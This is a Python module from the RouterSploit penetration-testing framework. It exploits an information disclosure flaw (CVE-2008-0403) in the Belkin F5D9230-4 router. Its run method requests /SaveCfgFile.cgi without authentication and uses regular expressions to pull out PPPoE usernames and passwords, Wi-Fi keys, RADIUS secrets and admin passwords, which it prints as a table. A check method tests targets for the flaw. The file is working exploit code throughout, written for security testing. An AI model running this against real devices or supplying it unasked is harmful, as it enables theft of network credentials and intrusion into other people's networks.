import re

from routersploit import (
    exploits,
    print_success,
    print_error,
    print_table,
    http_request,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for Belkin Wireless G Plus MIMO Router F5D9230-4 information disclosure vulnerability.
    If the target is vulnerable, sensitive information such as credentials are returned.
    """
    __info__ = {
        'name': 'Belkin G Info Disclosure',
        'description': 'Module exploits Belkin Wireless G Plus MIMO Router F5D9230-4 information disclosure '
                       'vulnerability which allows fetching sensitive information such as credentials.',
        'authors': [
            'DarkFig',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0403',
            'https://www.exploit-db.com/exploits/4941/',
        ],
        'devices': [
            'Belkin G',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)
    port = exploits.Option(80, 'Target Port')

    def run(self):
        url = "{}:{}/SaveCfgFile.cgi".format(self.target, self.port)

        response = http_request(method="GET", url=url)
        if response is None:
            return

        var = [
            'pppoe_username',
            'pppoe_password',
            'wl0_pskkey',
            'wl0_key1',
            'mradius_password',
            'mradius_secret',
            'httpd_password',
            'http_passwd',
            'pppoe_passwd'
        ]

        data = []
        for v in var:
            regexp = '{}="(.+?)"'.format(v)

            val = re.findall(regexp, response.text)
            if len(val):
                data.append((v, val[0]))

        if len(data):
            print_success("Exploit success")
            headers = ("Option", "Value")
            print_table(headers, *data)

        else:
            print_error("Exploit failed")

    @mute
    def check(self):
        url = "{}:{}/SaveCfgFile.cgi".format(self.target, self.port)

        response = http_request(method="GET", url=url)
        if response is None:
            return False  # target is not vulnerable

        var = [
            'pppoe_username',
            'pppoe_password',
            'wl0_pskkey',
            'wl0_key1',
            'mradius_password',
            'mradius_secret',
            'httpd_password',
            'http_passwd',
            'pppoe_passwd'
        ]

        if any(map(lambda x: x in response.text, var)):
            return True   # target vulnerable

        return False  # target is not vulnerable
